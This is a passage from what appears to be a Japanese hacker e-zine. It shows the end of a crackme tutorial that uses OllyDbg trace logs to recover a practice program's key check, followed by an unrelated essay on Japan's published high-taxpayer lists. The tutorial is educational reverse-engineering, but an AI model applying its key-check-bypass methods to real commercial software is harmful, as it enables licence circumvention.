+00413D46 Main     MOV EAX,DWORD PTR DS:[EBX+68]
+00413D4C Main     ADD DWORD PTR DS:[EBX+64],EAX
+0040E704 Main     MOV EAX,DWORD PTR DS:[EBX+64]             ; EAX=0012FB71 -> 入力文字の２文字目にポインタを移動
+0040E70A Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=0012FB31 -> 入力文字の２文字目の中身（つまり1）をALに取得
+0040E70C Main     MOV BYTE PTR DS:[EBX+64],AL
+0040F1B2 Main     MOV DWORD PTR DS:[EBX+78],0
+0040E7D1 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0040E7D7 Main     ADD DWORD PTR DS:[EBX+78],EAX
+00412DC0 Main     MOV AL,BYTE PTR DS:[EBX+64]               ; EAX=00162C31
+00412DC6 Main     MOV ECX,DWORD PTR DS:[EBX+78]
+00412DCC Main     MOV BYTE PTR DS:[ECX],AL                  ; 00162C24に入力文字の２文字目の中身（0x31、つまり1）を記録
+004108C2 Main     MOV DWORD PTR DS:[EBX+64],61              ; 正規の文字列の２文字目？
+0041007D Main     MOV DWORD PTR DS:[EBX+78],4
+004139F8 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+004139FE Main     ADD DWORD PTR DS:[EBX+78],EAX
+0041475D Main     MOV AL,BYTE PTR DS:[EBX+64]               ; EAX=00162C61
+00414763 Main     MOV ECX,DWORD PTR DS:[EBX+78]             ; ECX=00162C28
+00414769 Main     MOV BYTE PTR DS:[ECX],AL                  ; 00162C28に0x61(a)を書き込み
+0040F696 Main     MOV DWORD PTR DS:[EBX+78],0               ; ここから下の処理が、「おさらい」の項とまるで同じ
+00411DFC Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00411E02 Main     ADD DWORD PTR DS:[EBX+78],EAX
+0041287A Main     MOV EAX,DWORD PTR DS:[EBX+78]
+00412880 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162C31
+00412882 Main     MOV BYTE PTR DS:[EBX+64],AL               ; [EBX+64]に入力文字の２文字目を入れている
+0040F65E Main     MOV DWORD PTR DS:[EBX+78],4
+00410165 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0041016B Main     ADD DWORD PTR DS:[EBX+78],EAX
+0040F5F2 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C28
+0040F5F8 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162C61
+0040F5FA Main     MOV BYTE PTR DS:[EBX+68],AL
+004108A5 Main     XOR EAX,EAX                               ; EAX=00000000
+004108A7 Main     MOV CL,BYTE PTR DS:[EBX+68]               ; ECX=00162C61
+004108AD Main     CMP BYTE PTR DS:[EBX+64],CL               ; CL=0x61(a)と[EBX+64]を比較。[EBX+64]には0x31(1)が入っている
+004108B3 Main     JNZ SHORT FSC_Leve.004108B6
+-----
+
+　おさらいの項の、1文字目の比較ルーチンと比較してみてください！後半の処理
+がかなり酷似していませんか？同じ場所を実行してはいないものの、チェックル
+ーチンの中身としては、同じものを使っているようです。よって、2文字目は「a」
+のようです。では、Ctrl+F2でプロセスをリスタート後、Ctrl+Gで004108ADに移動
+し、F2でブレークポイントを張ってF9で実行し、「Sa23456789abcdef」を与えて
+みましょう。すると、「a」同士を比較しているのが見えるはずです。1文字目、
+2文字目の比較結果から、00162C24に入力文字列が、00162C28には本物のKey文字
+列が入るようです。これが解析を楽にしてくれる糸口になってくれるとよいので
+すが。
+
+　ではCtrl+F12でトレース実行して、3文字目以降の比較処理を見るために、そ
+のログを確認してみましょう。
+
+
+■0x04.) 4文字目の特定
+
+　ログを確認したところ、前項までに確認したような内容と同じような処理が行
+なわれ、今度は4文字目を比較していそうなことがわかりました。
+
+----- 4文字目の比較処理付近のトレースログ（jmp命令省略版）
+00410476 Main     MOV DWORD PTR DS:[EBX+78],0
+004146B7 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+004146BD Main     ADD DWORD PTR DS:[EBX+78],EAX
+0040ED10 Main     MOV EAX,DWORD PTR DS:[EBX+78]
+0040ED16 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162C33 -> 0x33は「3」にあたる。入力文字の4文字目
+0040ED18 Main     MOV BYTE PTR DS:[EBX+64],AL
+0040FF07 Main     MOV DWORD PTR DS:[EBX+78],4
+0040F43A Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0040F440 Main     ADD DWORD PTR DS:[EBX+78],EAX
+00411F0A Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C28
+00411F10 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162C6A -> 0x6Aは「j」。正規の4文字目と思われる文字
+00411F12 Main     MOV BYTE PTR DS:[EBX+68],AL
+0041079E Main     XOR EAX,EAX                               ; EAX=00000000
+004107A0 Main     MOV CL,BYTE PTR DS:[EBX+68]               ; ECX=00162C6A
+004107A6 Main     CMP BYTE PTR DS:[EBX+64],CL               ; jと3を比較
+004107AC Main     JNZ SHORT FSC_Leve.004107AF
+-----
+
+　なぜ3文字目ではなく、先に4文字目から比較しているのかという疑問はさて
+おき、順調に3つの文字列がわかりました。ここまでを整理すると、正規文字列
+は「Sa?j????????????」であることまでわかっています。
+
+　では、004107A6にブレークポイントを設定して実行し、「Sa2j456789abcdef」
+を与えて004107A6まで実行後、Ctrl+F12でとレースログを取って、次の処理を見
+てみましょう。
+
+
+■0x05.) 5文字目＋7文字目のチェックをクリアする
+
+　さて、ここまでは順調でしたが、ちょっとここで困ったことになりました。条
+件ジャンプ（JEやJNZなど）やcmp命令を頼りにログを検索したところ、以前と同
+じような処理が見つかったことは見つかったのですが、なんと0xBA（本物のKeyと
+思われる文字列）と0x6A（入力文字と思われる文字列）を比較しています。
+
+----- どこかの文字列を比較している処理付近のトレースログ（jmp命令省略版）
+004119ED Main     MOV DWORD PTR DS:[EBX+78],0
+0041127A Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00411280 Main     ADD DWORD PTR DS:[EBX+78],EAX
+0041436E Main     MOV EAX,DWORD PTR DS:[EBX+78]
+00414374 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162C6A -> 入力文字列と思われる文字
+00414376 Main     MOV BYTE PTR DS:[EBX+64],AL
+00412111 Main     MOV DWORD PTR DS:[EBX+78],4
+004119C9 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+004119CF Main     ADD DWORD PTR DS:[EBX+78],EAX
+004133C0 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C28
+004133C6 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162CBA -> 正規の文字列と思われる文字
+004133C8 Main     MOV BYTE PTR DS:[EBX+68],AL
+0040E7A2 Main     XOR EAX,EAX                               ; EAX=00000000
+0040E7A4 Main     MOV CL,BYTE PTR DS:[EBX+68]               ; ECX=00162CBA
+0040E7AA Main     CMP BYTE PTR DS:[EBX+64],CL               ; 0xBAと0x6Aを比較
+0040E7B0 Main     JNZ SHORT FSC_Leve.0040E7B3
+-----
+
+　入力文字列の方の0x6Aは4文字目の「j」にあたる仮定したとしても、0xBAは半
+角カタカナの「コ」にあたります。パスワードやKeyとして使われる数字ではあり
+ませんし、このプログラムの出どころから考えて、ヨーロッパの人々がこのよう
+な機種依存文字を使うとは思えません。これは、これより前の処理を詳細に解析
+する必要がありそうです。では、それ以前のトレースログを見てみましょう。
+
+
+----- 4文字目の比較命令（cmp）以降のトレースログ（jmp命令省略版）
+004107AC Main     JNZ SHORT FSC_Leve.004107AF
+004107AE Main     INC EAX                                   ; EAX=00000001
+004107AF Main     MOV BYTE PTR DS:[EBX+64],AL
+0041317A Main     AND BYTE PTR DS:[EBX+64],1
+00413181 Main     XOR BYTE PTR DS:[EBX+64],1
+00413D36 Main     MOV DWORD PTR DS:[EBX+78],0
+00410214 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0041021A Main     ADD DWORD PTR DS:[EBX+78],EAX
+0040E74A Main     MOV AL,BYTE PTR DS:[EBX+64]               ; EAX=00162C00
+0040E750 Main     MOV ECX,DWORD PTR DS:[EBX+78]             ; ECX=00162C24
+0040E756 Main     MOV BYTE PTR DS:[ECX],AL
+00412808 Main     MOV DWORD PTR DS:[EBX+78],0
+00413F92 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00413F98 Main     ADD DWORD PTR DS:[EBX+78],EAX
+0041055E Main     MOV EAX,DWORD PTR DS:[EBX+78]
+00410564 Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=00000000
+00410566 Main     MOV DWORD PTR DS:[EBX+64],EAX
+00413921 Main     CMP DWORD PTR DS:[EBX+64],0
+0041392B Main     JE SHORT FSC_Leve.00413932
+-----
+
+　ここまでは、2文字目の処理の最初で見たものと同様です。ということは、ここ
+から0040E7AAのCMP命令までの間に、何らかのトリックが存在することは間違いあ
+りません。ではその次をさらに見てみましょう。
+
+----- 0041392BのJE命令の飛び先以降の処理（jmp命令省略版）
+00413932 Main     JMP FSC_Leve.0040F53C                     ; 0041392BのJEからここへジャンプ
+0040F53C Main     MOV DWORD PTR DS:[EBX+64],4
+0040EA65 Main     MOV DWORD PTR DS:[EBX+78],0
+0040E3EC Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0040E3F2 Main     ADD DWORD PTR DS:[EBX+78],EAX
+00410AB1 Main     MOV EAX,DWORD PTR DS:[EBX+64]             ; EAX=00000004
+00410AB7 Main     MOV ECX,DWORD PTR DS:[EBX+78]
+00410ABD Main     MOV DWORD PTR DS:[ECX],EAX
+00412EFA Main     MOV DWORD PTR DS:[EBX+78],0
+0041240C Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00412412 Main     ADD DWORD PTR DS:[EBX+78],EAX
+0040F20E Main     MOV EAX,DWORD PTR DS:[EBX+78]
+0040F214 Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=00000004 -> 検査対象文字の位置（文字列の配列の添え字）？
+0040F216 Main     MOV DWORD PTR DS:[EBX+64],EAX
+00413CA4 Main     MOV DWORD PTR DS:[EBX+78],-4
+00413C5A Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00413C60 Main     ADD DWORD PTR DS:[EBX+78],EAX
+0040F716 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C20
+0040F71C Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=0012FB70 -> 配列の先頭アドレス
+0040F71E Main     MOV DWORD PTR DS:[EBX+68],EAX
+00413556 Main     MOV EAX,DWORD PTR DS:[EBX+68]
+0041355C Main     ADD DWORD PTR DS:[EBX+64],EAX
+0040E920 Main     MOV EAX,DWORD PTR DS:[EBX+64]             ; EAX=0012FB74 -> 配列の先頭アドレス+4（Key[4]）
+0040E926 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=0012FB34 -> Key[4]（5文字目）は4なので、0x34がALに読み込まれた
+0040E928 Main     MOV BYTE PTR DS:[EBX+64],AL
+-----
+
+　ここまでの処理を見てください。5文字目を読み込んでいるのがわかります。と
+いうことは、5文字目が関係していそうなことはわかります。では、ここからどの
+ような処理がさらにされているのかを見てみましょう。
+
+----- 0040E928以降の処理（jmp命令省略版）
+004135B0 Main     MOV DWORD PTR DS:[EBX+78],0
+00411624 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0041162A Main     ADD DWORD PTR DS:[EBX+78],EAX
+00411CCC Main     MOV AL,BYTE PTR DS:[EBX+64]               ; EAX=00162C34
+00411CD2 Main     MOV ECX,DWORD PTR DS:[EBX+78]
+00411CD8 Main     MOV BYTE PTR DS:[ECX],AL
+004106B6 Main     MOV DWORD PTR DS:[EBX+64],6
+00413BFE Main     MOV DWORD PTR DS:[EBX+78],4
+0040F374 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0040F37A Main     ADD DWORD PTR DS:[EBX+78],EAX
+004147D7 Main     MOV EAX,DWORD PTR DS:[EBX+64]             ; EAX=00000006
+004147DD Main     MOV ECX,DWORD PTR DS:[EBX+78]             ; ECX=00162C28
+004147E3 Main     MOV DWORD PTR DS:[ECX],EAX
+00412046 Main     MOV DWORD PTR DS:[EBX+78],4
+00412346 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0041234C Main     ADD DWORD PTR DS:[EBX+78],EAX
+00414585 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C28
+0041458B Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=00000006 -> 配列の添え字？
+0041458D Main     MOV DWORD PTR DS:[EBX+64],EAX
+00410131 Main     MOV DWORD PTR DS:[EBX+78],-4
+004102DC Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+004102E2 Main     ADD DWORD PTR DS:[EBX+78],EAX
+00411991 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C20
+00411997 Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=0012FB70 -> 配列の先頭アドレス
+00411999 Main     MOV DWORD PTR DS:[EBX+68],EAX
+0041167E Main     MOV EAX,DWORD PTR DS:[EBX+68]
+00411684 Main     ADD DWORD PTR DS:[EBX+64],EAX
+0040F4A8 Main     MOV EAX,DWORD PTR DS:[EBX+64]             ; EAX=0012FB76 -> 配列の先頭アドレス+6（Key[6]）
+0040F4AE Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=0012FB36 -> Key[6]（＝7文字目）は0x36(6)
+0040F4B0 Main     MOV BYTE PTR DS:[EBX+64],AL
+00410226 Main     MOV DWORD PTR DS:[EBX+78],4
+0040E6DE Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0040E6E4 Main     ADD DWORD PTR DS:[EBX+78],EAX
+0040FFD7 Main     MOV AL,BYTE PTR DS:[EBX+64]               ; EAX=00162C36
+0040FFDD Main     MOV ECX,DWORD PTR DS:[EBX+78]
+0040FFE3 Main     MOV BYTE PTR DS:[ECX],AL
+004134EC Main     MOV DWORD PTR DS:[EBX+78],0
+0040E428 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0040E42E Main     ADD DWORD PTR DS:[EBX+78],EAX
+0041025C Main     MOV EAX,DWORD PTR DS:[EBX+78]
+00410262 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162C34
+00410264 Main     MOV BYTE PTR DS:[EBX+64],AL               ; [EBX+64]に0x34を代入（Key[4]＝5文字目）
+00413470 Main     MOV DWORD PTR DS:[EBX+78],4
+00411C38 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00411C3E Main     ADD DWORD PTR DS:[EBX+78],EAX
+004103F2 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C28
+004103F8 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162C36
+004103FA Main     MOV BYTE PTR DS:[EBX+68],AL               ; [EBX+68]に0x36を代入（Key[6]＝7文字目）
+00413376 Main     MOV AL,BYTE PTR DS:[EBX+68]               ; ALに0x36を代入
+0041337C Main     ADD BYTE PTR DS:[EBX+64],AL               ; 0x34([EBX+64]の値)+0x36(ALレジスタ)で[EBX+64]は0x6Aとなる
+004135A0 Main     MOV DWORD PTR DS:[EBX+78],0
+00410D57 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00410D5D Main     ADD DWORD PTR DS:[EBX+78],EAX
+004148B9 Main     MOV AL,BYTE PTR DS:[EBX+64]               ; EAX=00162C6A
+004148BF Main     MOV ECX,DWORD PTR DS:[EBX+78]             ; ECX=00162C24
+004148C5 Main     MOV BYTE PTR DS:[ECX],AL                  ; 0x6A(Key[4]+Key[6])を[00162C24]に代入
+0040E4DC Main     MOV DWORD PTR DS:[EBX+64],0BA             ; 本物のKey(Key[4]+Key[6]=0xBA)
+004104AA Main     MOV DWORD PTR DS:[EBX+78],4
+0040F3E0 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0040F3E6 Main     ADD DWORD PTR DS:[EBX+78],EAX
+004131E8 Main     MOV EAX,DWORD PTR DS:[EBX+64]             ; EAX=000000BA
+004131EE Main     MOV ECX,DWORD PTR DS:[EBX+78]             ; ECX=00162C28
+004131F4 Main     MOV DWORD PTR DS:[ECX],EAX
+-----
+
+　ちょっと長いですが、辛抱強く見てください。先ほど、Key[4]（5文字目）が参
+照されたことがわかりましたが、それにKey[6]（7文字目）を加えて、それを0xBA
+と比較しています。つまり、Key[4]+Key[6]=0xBAという式になります。つまり、
+5文字目と7文字目を足した値が0xBAになるような組み合わせを考えれば、先ほど
+のCMP命令をクリアできそうです。いろいろ組み合わせが考えられますが、仮に5
+文字目を「a」(0x61)と仮定し、それを基準に7文字目を算出してみます。0xBA-
+0x61=0x59(Y)となります。よって5文字目を「a」と7文字目を「Y」に置き換える
+ことになります。では、プロセスをリスタート後、0040E7AAにブレークポイント
+を張って、「Sa2ja5Y789abcdef」を与えてみます。すると、0040E7AAでブレーク
+した時点で0xBA同士を比較していることがわかり、ここのチェックをクリアでき
+ることがわかりました。
+
+　では、この時点からのトレースログを取り、またこれ以降の処理を見てみるこ
+とにします。
+
+
+■0x06.) 5文字目＋6文字目のチェックをクリアする
+
+　先ほどと処理的には同じなので、かいつまんで説明します。
+
+----- Key[4]（5文字目）を取り出す処理（jmp命令省略版）
+0040F988 Main     MOV EAX,DWORD PTR DS:[EBX+78]
+0040F98E Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=00000004 -> 配列の添え字
+0040F990 Main     MOV DWORD PTR DS:[EBX+64],EAX
+0040E872 Main     MOV DWORD PTR DS:[EBX+78],-4
+004149D7 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+004149DD Main     ADD DWORD PTR DS:[EBX+78],EAX
+0040F4BC Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C20
+0040F4C2 Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=0012FB70 -> 配列の先頭アドレス
+0040F4C4 Main     MOV DWORD PTR DS:[EBX+68],EAX
+00413C34 Main     MOV EAX,DWORD PTR DS:[EBX+68]
+00413C3A Main     ADD DWORD PTR DS:[EBX+64],EAX
+00412B01 Main     MOV EAX,DWORD PTR DS:[EBX+64]             ; EAX=0012FB74 -> 配列の先頭+4（Key[4]）
+00412B07 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=0012FB61 -> Key[4]はa(0x61)なので、ALに0x61が入る
+00412B09 Main     MOV BYTE PTR DS:[EBX+64],AL               ; [EBX+64]に0x61を代入
+-----
+
+----- Key[5]（6文字目）を取り出す処理（jmp命令省略版）
+00412B31 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C28
+00412B37 Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=00000005 -> 配列の添え字
+00412B39 Main     MOV DWORD PTR DS:[EBX+64],EAX
+00413638 Main     MOV DWORD PTR DS:[EBX+78],-4
+0040E98E Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+0040E994 Main     ADD DWORD PTR DS:[EBX+78],EAX
+00412012 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C20
+00412018 Main     MOV EAX,DWORD PTR DS:[EAX]                ; EAX=0012FB70 -> 配列の先頭アドレス
+0041201A Main     MOV DWORD PTR DS:[EBX+68],EAX
+00413604 Main     MOV EAX,DWORD PTR DS:[EBX+68]
+0041360A Main     ADD DWORD PTR DS:[EBX+64],EAX
+00411E48 Main     MOV EAX,DWORD PTR DS:[EBX+64]             ; EAX=0012FB75 -> 配列の先頭アドレス+5(Key[5])
+00411E4E Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=0012FB35 -> Key[5]（6文字目）は0x35
+00411E50 Main     MOV BYTE PTR DS:[EBX+64],AL               ; [EBX+64]に0x35を代入
+-----
+
+　入力文字は0x61(Key[4])+0x35(Key[5])=0x96となります。正規と思われる文字
+は以下のコードにおいて00411A48のcmp命令で0xCEと比較していたことから、本物
+のKeyはKey[4]+Key[5]=0xCEとなります。
+
+----- 比較処理付近のログ（jmp命令省略版）
+0041099D Main     MOV DWORD PTR DS:[EBX+78],0
+00412131 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00412137 Main     ADD DWORD PTR DS:[EBX+78],EAX
+00410DD1 Main     MOV EAX,DWORD PTR DS:[EBX+78]
+00410DD7 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162C96 -> 仮のKey[4]+Key[5]
+00410DD9 Main     MOV BYTE PTR DS:[EBX+64],AL
+00413066 Main     MOV DWORD PTR DS:[EBX+78],4
+0041221D Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00412223 Main     ADD DWORD PTR DS:[EBX+78],EAX
+00411391 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C28
+00411397 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162CCE -> 本物のKey[4]+Key[5]
+00411399 Main     MOV BYTE PTR DS:[EBX+68],AL
+00411A40 Main     XOR EAX,EAX                               ; EAX=00000000
+00411A42 Main     MOV CL,BYTE PTR DS:[EBX+68]               ; ECX=00162CCE
+00411A48 Main     CMP BYTE PTR DS:[EBX+64],CL
+00411A4E Main     JNZ SHORT FSC_Leve.00411A51
+-----
+
+　とりあえず、現在はKey[4]=0x61(a)としていますので、Key[5]は0xCE-0x61=0x
+6D(m)でいけそうです。プロセスをリスタート後、00411A48にブレークポイントを
+張り、Key[5]（6文字目）を「m」に変え、「Sa2jamY789abcdef」として0041A48ま
+で実行してみましょう。今度は0xCE同士を比較することになったと思います。ブ
+レークした時点から、再度Ctrl+F12でトレースログをとりながら実行してみまし
+ょう。
+
+
+■0x07.) 6文字目＋7文字目のチェックをクリアする
+
+　今度も前2項と同様の処理内容でしたが、6文字目と7文字目を足したものを0xE0
+と比較していることがわかりました。以下は最後の部分だけを抜き出しています。
+
+----- 比較処理付近のログ（jmp命令省略版）
+00413670 Main     MOV DWORD PTR DS:[EBX+78],0
+00410803 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00410809 Main     ADD DWORD PTR DS:[EBX+78],EAX
+00410CF6 Main     MOV EAX,DWORD PTR DS:[EBX+78]
+00410CFC Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162CC6 -> 仮のKey[5]+Key[6]（0x6D(m)+0x59(Y)=0xC6)
+00410CFE Main     MOV BYTE PTR DS:[EBX+64],AL
+0040F594 Main     MOV DWORD PTR DS:[EBX+78],4
+00412EC4 Main     MOV EAX,DWORD PTR DS:[EBX+8]              ; EAX=00162C24
+00412ECA Main     ADD DWORD PTR DS:[EBX+78],EAX
+00413C90 Main     MOV EAX,DWORD PTR DS:[EBX+78]             ; EAX=00162C28
+00413C96 Main     MOV AL,BYTE PTR DS:[EAX]                  ; EAX=00162CE0 -> 本当のKey[5]+Key[6]
+00413C98 Main     MOV BYTE PTR DS:[EBX+68],AL
+00411AC3 Main     XOR EAX,EAX                               ; EAX=00000000
+00411AC5 Main     MOV CL,BYTE PTR DS:[EBX+68]               ; ECX=00162CE0
+00411ACB Main     CMP BYTE PTR DS:[EBX+64],CL
+00411AD1 Main     JNZ SHORT FSC_Leve.00411AD4
+
+　よって、Key[5]+Key[6]=0xE0となります。
+
+
+■0x08.) 5文字目、6文字目、7文字目の特定
+
+　とりあえず、仮の文字列を与えて、何とかここまでクリアしてきましたが、こ
+このチェックは以下の条件を同時に満たす文字列を算出しない限り、先には進め
+なさそうです。では、ここまでの条件を再度整理してみましょう。
+
+5文字目+7文字目=0xBA
+5文字目+6文字目=0xCE
+6文字目+7文字目=0xE0
+
+　上記の条件を同時に満たせば、ここをクリアできます。ただし先ほどまでのよ
+うに、仮の文字を与えて、その差を微調整していくようなやり方だと非常に時間
+がかかってしまいます。どうすればよいでしょうか？ここで5文字目をx6文字目を
+y、7文字目をzにそれぞれ置き換えてみます。
+
+x+z=0xBA   ... 式1
+x+y=0xCE   ... 式2
+y+z=0xE0   ... 式3
+
+　どこかで見たようなものになりませんか？右辺こそ16進数になっていますが、
+形は中学時代にやったはずの三元一次連立方程式です。これで解けそうですね。
+
+
+----- 計算
+式3のyを右辺に移行
+z=0xE0-y
+
+式3を式1に当てはめ、zにあたる部分を右辺に移行
+x+(0xE0-y)=0xBA
+x=0xBA-0xE0+y
+
+上記を式2に当てはめ、yを求める
+(0xBA-0xE0+y)+y=0xCE
+2y=0xCE-0xBA+0xE0
+2y=0xF4
+y=0x7A
+
+yを求められたので、式2にそれを当てはめ、xを求める
+x+0x7A=0xCE
+x=0xCE-0x7A
+x=0x54
+
+xを求めたので、それを式1に当てはめ、zを求める
+z=0xBA-0x54
+z=0x66
+-----
+
+　よって、以下のような結果になりました。
+x=5文字目=Key[4]=54(T)
+y=6文字目=Key[5]=7A(z)
+z=7文字目=Key[6]=66(f)
+
+　これらの文字列を反映した結果、「Sa2jTzf789abcdef」という文字列になりま
+した。これを与えれば、00411ACBのCMP命令まではクリアできます。
+
+
+■0x09.) 所感
+
+　さて、いかがでしたでしょうか？今回は、見るべきコードが多くて、大変だっ
+たと思います。また、中学校の数学を思い出さなければならなかったので、それ
+も大変だったかもしれません。また今回は私自身、時間が取れず、説明を省略し
+て書いてしまっているところもあり、わかりづらい文章になってしまっているか
+もしれません。すみません。
+
+　まだまだ先は長いですが、徐々に説明していきたいと思います。それでは、ま
+た。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第3章: 長者番付における日本社会の闇  ---
+
+著者：理事長
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　Guten Tag !
+　Wie geht es Ihnen ? 
+
+　Wizard Bible vol.17で「東京賃貸生活ぐんにょり物語」を執筆させていただき
+ました、宗凶法人愛連合中央執行委員会執行統括理事長Rudolph von Gartheimer
+でございます。
+
+　この度、懲りずにWizard Bibleに原稿を寄せてみました。しばしの間、お時間
+をいただければ幸いでございます。
+
+
+■0x02.) 確定申告にも恐るべき日本の闇と不条理
+
+　さて、新年度が始まり、去年はサラリーマンには毎年減っているとはいえ、冬
+のボーナスともう一つの楽しみ年末調整の時期がありました。しかしながら、こ
+の年末調整は、簡単に言うと「今まで余計に徴収していた税金を還付しますよ」
+ということなのですが、利息も付かないし、企業の会計処理は税務署の徴収機関
+と成り果てています。その上、身内に障害者がいたり、妻が外国人だったりする
+と、そういうプライベートなことはすべて会社に筒抜けとなり、税金を取られて
+いるサラリーマンは自分の納めている税金の金額すら、把握していないという駄
+目駄目さが漂ってしまいます。
+　こういう制度があるから日本人の税意識は遅れてしまうのです。消費税の税率
+だけに注目しないで、こういった所にも目を向けないと日本の「本当の意味」で
+の改革は訪れるはずもありません。
+
+　前述の話は自営業者の皆さんには関係ないかもしれません。例えばライターを
+生業としている人は翌年に確定申告を済ませばそれで終わるからです。
+　だが確定申告にも恐るべき日本の闇と不条理が潜んでいます。
+　シェークスピアの「ベニスの商人」を引くまでもなく、「金持ち＝悪 貧乏＝善」
+と言うのが世に広まってるテーマでありますが。社会主義思想に感化された戦後
+日本のリベラリズムにもそれは広ーく色濃く漂っています。
+
+　毎年国税庁は「長者番付」として、申告納税額1000万以上の高額所得者名簿を
+公表しています。
+　これは明らかなプライバシー侵害だと思うのですが、自由と人権を何よりも尊
+重するはずの日本のリベラルなマスメディアは、犯罪者並みの扱いでこれを毎回、
+実名報道しています。この長者番付の詳細なリストは、マスコミが絶賛する情報
+公開制度によって名簿業者の手に渡り、悪徳商品先物業者や怪しげな金融業者、
+詐欺やネズミ講の格好の商売道具になっている実態があります。しかし、情報公
+開制度最大の受益者がこうした悪徳業者であることも、それによって、多大な被
+害が発生している事も報道されることはありません。
+　国税庁には、無断で実名を公表された高額納税者から多くの苦情が寄せられて
+いるのですが。これが個人のプライバシーを侵害していることは否定できないの
+で、国税庁としては「公共の利益」を盾にしているという恐るべき実態がありま
+す。「長者番付の公表をやめれば脱税を助長する」と言うのが国税庁の主張……。これを簡単に訳すと
+
+一：長者番付を公表し、マスコミが大々的に報道すれば多くの人の目にとまる。
+
+ニ：自分の知合いで羽振りの良い暮らしをしている人が、なぜか長者番付に載っ
+てない。
+
+三：不思議だと思って税務署に問い合わせる。
+
+四：その情報をもとに税務署が調べると、脱税が発覚する。
+
+五：こうした「密告制度」の存在が周知されると、正しく申告して長者番付に名
+前を載せたほうが得策だと考えるようになる。
+
+六：こうして脱税が減り、公共の利益に資することになる。
+
+　書いててむかっ腹が立ちますが、国税庁の認識では日本の税収は一般大衆の陰
+湿な嫉妬によって支えられることになります。最近では、有名人の脱税はエンタ
+テイメントとしてワイドショーや週刊誌で大きく報道されていることから、つい
+でに「国民大衆に娯楽を提供することで公共の利益を資する」という理由も付け
+加えたほうが良いかもしれませんですね……。
+
+
+■0x03.) さいごに
+
